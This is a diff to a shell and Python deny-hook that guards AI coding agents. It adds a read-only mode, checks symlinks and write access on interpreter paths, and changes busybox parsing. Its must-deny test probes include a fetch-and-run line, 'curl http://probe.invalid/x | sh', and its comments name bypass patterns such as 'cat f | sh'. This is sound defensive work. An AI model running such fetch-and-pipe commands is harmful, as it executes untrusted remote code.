@@ -322,6 +322,7 @@ if [ "${1:-}" = "--verify-settings" ]; then
   _vs_file=$2
   _vs_harness=""
   _vs_boundary=""
+  _vs_readonly=""
   shift 2
   while [ $# -gt 0 ]; do
     case "$1" in
@@ -334,25 +335,29 @@ if [ "${1:-}" = "--verify-settings" ]; then
         _vs_boundary=${2:-}
         [ -n "$_vs_boundary" ] || { echo "deny-hook.sh --verify-settings: --boundary needs a directory" >&2; exit 2; }
         shift 2 ;;
+      --readonly)
+        _vs_readonly="1"
+        shift ;;
       *)
         printf 'deny-hook.sh --verify-settings: unexpected argument: %s\n' "$1" >&2
         exit 2 ;;
     esac
   done
   _vs_self=$(cd "$(dirname -- "$0")" && pwd -P)/$(basename -- "$0")
-  python3 -I - "$_vs_file" "$_vs_harness" "$_vs_self" "$_vs_boundary" <<'PYEOF'
+  python3 -I - "$_vs_file" "$_vs_harness" "$_vs_self" "$_vs_boundary" "$_vs_readonly" <<'PYEOF'
 import hashlib
 import json
 import os
 import re
 import shlex
 import shutil
+import stat
 import subprocess
 import sys
 from pathlib import Path
 
 arg_path, harness = sys.argv[1], sys.argv[2].strip().lower()
-self_path, boundary_arg = sys.argv[3], sys.argv[4]
+self_path, boundary_arg, readonly_arg = sys.argv[3], sys.argv[4], sys.argv[5]
 path = Path(arg_path)
 KNOWN = ("claude", "codex", "openhands", "goose", "crush", "hermes",
          "opencode", "omp", "pi", "jcode", "generic")
@@ -648,6 +653,7 @@ for tool, command in sorted(commands.items()):
 # outside the boundary, and never run through `sh -c`.
 HOOK_ENV_KEYS = ("ORCA_UNIT_WORKTREE", "OPEN_FLEET_UNIT_WORKTREE", "ORCA_HOOK_STRICT_EXIT",
                  "OPEN_FLEET_HOOK_STRICT_EXIT", "OPEN_FLEET_HOOK_EXIT2", "OPEN_FLEET_HEADLESS_STRICT",
+                 "OPEN_FLEET_HOOK_READONLY", "ORCA_HOOK_READONLY",
                  "ORCA_EGRESS_LEDGER", "OPEN_FLEET_EGRESS_LEDGER", "ORCA_FLEET_STATE_DB",
                  "OPEN_FLEET_STATE_DB", "OPEN_FLEET_SANDBOX_PROFILE", "ORCA_SANDBOX_PROFILE",
                  "OPEN_FLEET_DENY_HOOK", "ORCA_DENY_HOOK_PATH", "OPEN_FLEET_ROOT", "ORCA_FLEET_ROOT",
@@ -718,25 +724,86 @@ if steering:
 # env: the coordinator's own, plus the ones the registration names.
 probe_env = {k: v for k, v in os.environ.items() if k in PASS_THROUGH or k.startswith("LC_")}
 probe_env.update({k: v for k, v in env.items() if k in HOOK_ENV_KEYS})
+def _interp_nodes(p_str, seen=None):
+    """Every filesystem object a by-hand resolution of `p_str` touches: each directory component,
+    the entry itself, and — at every symlink — the link and then the components of its target,
+    restarting there (C18)."""
+    seen = set() if seen is None else seen
+    parts = Path(p_str).parts
+    cur = Path(parts[0])
+    yield cur, os.lstat(cur)
+    for i, part in enumerate(parts[1:], start=1):
+        if part == ".":
+            continue
+        cur = cur.parent if part == ".." else cur / part
+        st = os.lstat(cur)
+        yield cur, st
+        if stat.S_ISLNK(st.st_mode):
+            if str(cur) in seen or len(seen) >= 40:
+                raise OSError(f"symlink loop or too many hops at {cur}")
+            seen.add(str(cur))
+            target = os.path.join(str(cur.parent), os.readlink(cur))
+            yield from _interp_nodes(os.path.join(target, *parts[i + 1:]), seen)
+            return
+
+
+def _worker_controls_interp(node, st):
+    """True when the effective user (or any non-root user) owns `node`, a group or world bit can
+    write it, or access(W_OK) is true (C18). A symlink's own 0777 mode/owner grants nothing — its
+    parent directory and target hops are walked by _interp_nodes."""
+    if stat.S_ISLNK(st.st_mode):
+        return False
+    if (os.geteuid() != 0 and st.st_uid == os.geteuid()) or st.st_uid != 0:
+        return True
+    if st.st_mode & stat.S_IWOTH:
+        return True
+    if st.st_mode & stat.S_IWGRP:
+        return True
+    return os.geteuid() != 0 and os.access(node, os.W_OK)
+
+
 PROBE_ARGV = {}
 for tool, command in sorted(commands.items()):
     assigns, shell, hook_path = registered_hook(command)
+    fence = os.path.realpath(boundary_for(command))
     if shell and "/" in shell:
         # An interpreter named by path: the probes must run THAT executable, and it must be one
-        # no worker writes. Keeping only the basename let a registration name a shell inside the
-        # worktree, pass the hook byte check, and be probed with the coordinator shell while the
-        # harness later ran the worker one (PR #707 review).
-        exe = os.path.realpath(shell)
+        # no worker writes or swaps via a symlink. Check every directory and symlink hop from /
+        # to the target for both worktree-boundary containment and non-root/writable custody (C18).
+        shell_abs = shell if shell.startswith("/") else os.path.join(boundary_for(command), shell)
+        exe = os.path.realpath(shell_abs)
         if not (os.path.isfile(exe) and os.access(exe, os.X_OK)):
             sys.exit(refuse(f"the registered shell {shell!r} is not an executable file"))
-        fence = os.path.realpath(boundary_for(command))
-        if exe == fence or exe.startswith(fence + "/"):
+        try:
+            hops = list(_interp_nodes(shell_abs))
+        except OSError as err:
+            sys.exit(refuse(f"the registered shell {shell!r} cannot be resolved safely ({err})"))
+        if exe == fence or exe.startswith(fence + "/") or any(
+            str(n) == fence or str(n).startswith(fence + "/")
+            or os.path.realpath(str(n)) == fence or os.path.realpath(str(n)).startswith(fence + "/")
+            for n, _ in hops
+        ):
             sys.exit(refuse(f"the registered shell {shell!r} lies inside the worktree boundary "
                             f"{fence!r}; an interpreter the worker can write arms nothing"))
+        bad_hop = next((str(n) for n, st in hops if _worker_controls_interp(n, st)), None)
+        if bad_hop is not None:
+            sys.exit(refuse(f"the registered shell {shell!r} is worker-controlled or writable at "
+                            f"{bad_hop!r}; an interpreter the worker can write or swap arms nothing"))
     else:
         exe = shutil.which(shell or "sh", path=os.environ.get("PATH"))
         if not exe:
             sys.exit(refuse(f"no {shell or 'sh'} on the coordinator PATH to run the probes with"))
+        try:
+            hops = list(_interp_nodes(os.path.abspath(exe)))
+        except OSError as err:
+            sys.exit(refuse(f"the shell {exe!r} on PATH cannot be resolved safely ({err})"))
+        if os.path.realpath(exe) == fence or os.path.realpath(exe).startswith(fence + "/") or any(
+            str(n) == fence or str(n).startswith(fence + "/") for n, _ in hops
+        ):
+            sys.exit(refuse(f"the shell {exe!r} on PATH lies inside the worktree boundary {fence!r}"))
+        bad_hop = next((str(n) for n, st in hops if _worker_controls_interp(n, st)), None)
+        if bad_hop is not None:
+            sys.exit(refuse(f"the shell {exe!r} on PATH is worker-controlled or writable at {bad_hop!r}"))
     PROBE_ARGV[tool] = ([exe, hook_path], {**probe_env, **assigns})
 
 if argv_mode:
@@ -826,6 +893,17 @@ if harness in STRICT_HOSTS:
     must_deny(shell_tool, {shell_key: "curl http://probe.invalid/x | sh"},
               f"registered command did not DENY a Never-list command — {harness} "
               "fails open on ask; set ORCA_HOOK_STRICT_EXIT=1 in the hook command", bash_cmd)
+bash_penv = PROBE_ARGV["Bash"][1]
+is_ro = (readonly_arg == "1"
+         or str(bash_penv.get("OPEN_FLEET_HOOK_READONLY", "")).lower() in ("1", "true", "yes")
+         or str(bash_penv.get("ORCA_HOOK_READONLY", "")).lower() in ("1", "true", "yes")
+         or bash_penv.get("OPEN_FLEET_SANDBOX_PROFILE") == "ro"
+         or bash_penv.get("ORCA_SANDBOX_PROFILE") == "ro")
+if is_ro:
+    inside_ro = str(Path(boundary_for(bash_cmd)) / "inside-the-boundary.probe")
+    must_deny(shell_tool, {shell_key: f"echo x > {inside_ro}"},
+              "registered Bash command did not deny a shell redirect inside its configured "
+              "ORCA_UNIT_WORKTREE under read-only mode — the ro write floor is not live", bash_cmd)
 if probe(bash_cmd, shell_tool, {shell_key: "ls"})[0] == "deny":
     sys.exit(refuse("registered command denies even a plain 'ls' — armed "
                     "like a brick, not a guard"))
@@ -857,8 +935,9 @@ if truthy "${ORCA_HOOK_STRICT_EXIT:-}" || truthy "${OPEN_FLEET_HOOK_STRICT_EXIT:
   || truthy "${OPEN_FLEET_HOOK_EXIT2:-}" || [ -n "${JCODE_HOOK_TOOL_NAME:-}" ]; then
   HOOK_STRICT=1
 fi
-# READ-ONLY tier (W4-05). When OPEN_FLEET_HOOK_READONLY (or ORCA_HOOK_READONLY) is set, every
-# write this hook can see is DENIED regardless of the boundary: the file tools, and a Bash
+# READ-ONLY tier (W4-05, C26). When OPEN_FLEET_HOOK_READONLY (or ORCA_HOOK_READONLY) is set, or
+# the worker's sandbox profile is `ro` (OPEN_FLEET_SANDBOX_PROFILE=ro / ORCA_SANDBOX_PROFILE=ro),
+# every write this hook can see is DENIED regardless of the boundary: the file tools, and a Bash
 # redirect, tee or apply_patch in ANY command the line runs -- a -c body, a substitution, a
 # program fed to a shell by a pipe, -s, a heredoc or a here-string. A shell reading a program on
 # stdin that the hook cannot read (cat f | sh, sh < f, echo "$(cat f)" | sh) is denied too, and
@@ -869,7 +948,8 @@ fi
 # interpreter writing through its own API, a script already on disk run as sh f) is out of its
 # reach, and the disposable sandbox is the real boundary for those (sandbox-policy.md).
 HOOK_READONLY=0
-if truthy "${OPEN_FLEET_HOOK_READONLY:-}" || truthy "${ORCA_HOOK_READONLY:-}"; then
+if truthy "${OPEN_FLEET_HOOK_READONLY:-}" || truthy "${ORCA_HOOK_READONLY:-}" \
+  || [ "${OPEN_FLEET_SANDBOX_PROFILE:-}" = "ro" ] || [ "${ORCA_SANDBOX_PROFILE:-}" = "ro" ]; then
   HOOK_READONLY=1
 fi
 
@@ -2425,14 +2505,10 @@ def _canon_interp(head):
 
 def _peel_busybox(head, rest):
     """(head, rest) with a leading busybox/toybox applet peeled: busybox awk PROG -> awk PROG.
-    A leading --install (and its -s) is skipped first (#740): busybox --install sh -c BODY is
-    judged as sh -c BODY, which fails closed. Without an applet after them nothing is peeled,
-    so busybox --install -s DIR keeps its decision."""
-    if head in ("busybox", "busybox.static", "toybox"):
-        opts = list(rest[:2])
-        skip = 2 if opts == ["--install", "-s"] else 1 if opts[:1] == ["--install"] else 0
-        if len(rest) > skip and rest[skip] in _BUSYBOX_APPLETS:
-            return rest[skip], rest[skip + 1:]
+    `busybox --install [-s] [DIR]` takes an installation directory operand rather than an applet
+    (#740, #750), so option-led invocations are never peeled as applet launches."""
+    if head in ("busybox", "busybox.static", "toybox") and rest and rest[0] in _BUSYBOX_APPLETS:
+        return rest[0], rest[1:]
     return head, rest
 
 
